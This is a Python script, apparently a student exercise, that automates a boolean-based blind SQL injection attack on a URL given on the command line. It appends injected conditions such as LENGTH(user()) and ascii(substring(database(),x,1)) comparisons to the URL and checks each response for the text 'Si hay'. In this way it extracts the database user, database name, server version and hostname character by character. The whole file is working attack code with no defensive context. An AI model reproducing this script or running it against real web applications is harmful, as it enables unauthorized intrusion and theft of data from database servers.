#!/usr/bin/python
#Ceron Rodriguez Lezly Dialid
#Recordatio: Crear funciones para evitar repetir tanto codigo
import requests
import sys

header = {'User-Agent':'Mozilla/5.0'} 

i=1
user=0
version=0
database=0
host=0
usuario = []
ver = []
base = []
hostname = []

while user == 0:
	url=sys.argv[1]+"' AND LENGTH(user()) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de usuario: " + str(i))
		user=i
	i= i+1
i=1
while version == 0:
	url=sys.argv[1]+"' AND LENGTH(@@version) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de version: " + str(i))
		version=i
	i= i+1
i=1
while database == 0:
	url=sys.argv[1]+"' AND LENGTH(database()) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de database: " + str(i))
		database=i
	i= i+1
i=1
while host == 0:
	url=sys.argv[1]+"' AND LENGTH(@@hostname) = " +str(i) +" -- -v" 
	response = requests.get(url,headers=header) 
	if "Si hay" in response.text:
		print("Tamanio de hostname: " + str(i))
		host=i
	i= i+1

for x in range(1, user+1):
	i=48
	while len(usuario) == x-1 and i<58:
		url=sys.argv[1]+"' AND ascii(substring(user()," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			usuario.append(chr(i))
		i=i+1
	i=65
	while len(usuario) == x-1 and i<91:
		url=sys.argv[1]+"' AND ascii(substring(user()," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			usuario.append(chr(i))
		i=i+1
	i=97
	while len(usuario) == x-1 and i<123:
		url=sys.argv[1]+"' AND ascii(substring(user()," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			usuario.append(chr(i))
		i=i+1
print("Usuario: ")
for x in range(len(usuario)): 
    print usuario[x], 

for x in range(1, database+1):
	i=48
	while len(base) == x-1 and i<58:
		url=sys.argv[1]+"' AND ascii(substring(database()," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			base.append(chr(i))
		i=i+1
	i=65
	while len(base) == x-1 and i<91:
		url=sys.argv[1]+"' AND ascii(substring(database()," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			base.append(chr(i))
		i=i+1
	i=97
	while len(base) == x-1 and i<123:
		url=sys.argv[1]+"' AND ascii(substring(database()," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			base.append(chr(i))
		i=i+1
print("\nBase de datos: ")
for x in range(len(base)): 
    print base[x], 


for x in range(1, version+1):
	i=48
	while len(ver) == x-1 and i<58:
		url=sys.argv[1]+"' AND ascii(substring(@@version," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			ver.append(chr(i))
		i=i+1
	i=65
	while len(ver) == x-1 and i<91:
		url=sys.argv[1]+"' AND ascii(substring(@@version," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			ver.append(chr(i))
		i=i+1
	i=97
	while len(ver) == x-1 and i<123:
		url=sys.argv[1]+"' AND ascii(substring(@@version," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			ver.append(chr(i))
		i=i+1
print("\nVersion: ")
for x in range(len(ver)): 
    print ver[x],

for x in range(1, host+1):
	i=48
	while len(hostname) == x-1 and i<58:
		url=sys.argv[1]+"' AND ascii(substring(@@hostname," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			hostname.append(chr(i))
		i=i+1
	i=65
	while len(hostname) == x-1 and i<91:
		url=sys.argv[1]+"' AND ascii(substring(@@hostname," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			hostname.append(chr(i))
		i=i+1
	i=97
	while len(hostname) == x-1 and i<123:
		url=sys.argv[1]+"' AND ascii(substring(@@hostname," +str(x) +",1)) = " +str(i) +" -- -v"
		response = requests.get(url,headers=header) 
		if "Si hay" in response.text:
			hostname.append(chr(i))
		i=i+1
print("\nHostname: ")
for x in range(len(hostname)): 
    print hostname[x],